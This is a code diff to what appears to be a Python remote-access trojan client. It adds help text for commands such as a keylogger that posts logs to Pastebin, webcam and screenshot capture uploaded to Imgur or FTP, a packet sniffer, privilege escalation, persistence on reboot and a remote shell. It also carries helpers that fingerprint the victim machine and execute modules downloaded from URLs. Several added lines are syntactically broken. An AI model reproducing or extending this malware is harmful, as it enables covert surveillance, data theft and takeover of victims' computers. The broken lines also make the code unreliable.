@@ -97,8 +97,6 @@ class Client(object):
         self._commands   = {cmd: getattr(self, cmd) for cmd in __command__}
         self._result     = self._get_framework()
 
-    # private worker functions
-
     def _wget(self, target): return urlretrieve(target)[0]
     
     def _cat(self,filename): return open(filename).read(4000) 
@@ -113,9 +111,9 @@ class Client(object):
 
     def _ls(self, *path): return '\n'.join(os.listdir(path[0])) if path else '\n'.join(os.listdir('.'))
 
-    def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]
+    def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs] + [self._usage()]
 
-    def _get_info(self): return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).replace('\n','') if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
+    def _get_info(self): return {'IP Address': self._ip(),'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Platform','Login','Machine','Admin','Device'}
 
     def _get(self, target): return getattr(self, target)() if target in ['jobs','results','options','status','commands','modules','info'] else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
   
@@ -423,7 +421,7 @@ class Client(object):
             elif action == 'update':
                 exec module in globals()
         else:
-            return "usage: {:>24}\noptions: {:>17}\narguments: {:>29}".format("new <option> [args]", "module, update", "url (must start with 'http')")
+            return self.new.usage
 
     def _new_module(self, uri, *kwargs):
         try:
@@ -538,6 +536,32 @@ class Client(object):
         except Exception as e:
             if self.__v__:
                 print "Error: '{}'".format(str(e))
+
+    def _usage(self):
+        self.ls.usage               = "usage:         ls <path>\ndescription:   list directory contents"
+        self.cd.usage               = "usage:         cd <path>\ndescription:   change directory"
+        self.set.usage              = "usage:         set <module> [option]=[value]\ndescription:   set module option"
+        self.new.usage              = "usage:         new <url>\ndescription:   download new module from url"
+        self.run.usage              = "usage:         run\ndescription:   run enabled client modules"
+        self.pwd.usage              = "usage:         pwd \ndescription:   present working directory"
+        self.jobs.usage             = "usage:         jobs\ndescription:   list currently active jobs"
+        self.kill.usage             = "usage:         kill\ndescription:   kill client"
+        self.show.usage             = "usage:         show <option>\ndescription:   show client attributes"
+        self.wget.usage             = "usage:         wget <url>\ndescription:   download file from url"
+        self.admin.usage            = "usage:         admin\ndescription:   attempt to escalate privileges"
+        self.shell.usage            = "usage:         shell\ndescription:   run client shell "
+        self.start.usage            = "usage:         start\ndescription:   start client"
+        self.webcam.usage           = "usage:         webcam\ndescription:   capture image/video from webcam + upload via Imgur / remote FTP"
+        self.enable.usage           = "usage:         enable <module>\ndescription:   enable module"
+        self.standby.usage          = "usage:         standby\ndescription:    revert to standby mode"
+        self.options.usage          = "usage:         options\ndescription:   display module options"
+        self.disable.usage          = "usage:         disable <module>\ndescription:   disable module"
+        self.results.usage          = "usage:         results\ndescription:   show all modules output"
+        self.commands.usage         = "usage:         commands\ndescription:   list commands with descriptions"
+        self.keylogger.usage        = "usage:         keylogger\ndescription:   log client keystrokes remotely + dump logs on Pastebin"
+        self.screenshot.usage       = "usage:         screenshot\ndescription:   take screenshot + upload to Imgur"
+        self.persistence.usage      = "usage:         persistence\ndescription:   establish persistence to relaunch on reboot"
+        self.packetsniffer.usage    = "usage:         packetsniffer\ndescription:   monitor client network traffic + dump capture on Pastebin"
 
     def _keylogger_event(self, event):
         if event.WindowName != self.keylogger.options['window']:
@@ -939,7 +963,7 @@ class Client(object):
         cx.update({fx.func_name: fx})
         return fx
 
-# ------------------ public/client functions --------------------------
+# ------------------ public client functions --------------------------
 
     @_command
     def cd(self, *x): return self._cd(*x)
@@ -1010,6 +1034,12 @@ class Client(object):
     @_module
     def packetsniffer(self): return self._packetsniffer()
 
+    @_command
+    def commands(self): return self._show({cmd for cmd in self._commands: self._commands[cmd].usage})
+
+    @_command
+    def modules(self): return self._show({mod for mod in self._modules: self._modules[mod].status})
+    
 # ----------------- MAIN --------------------------
 
 def main(*args, **kwargs):
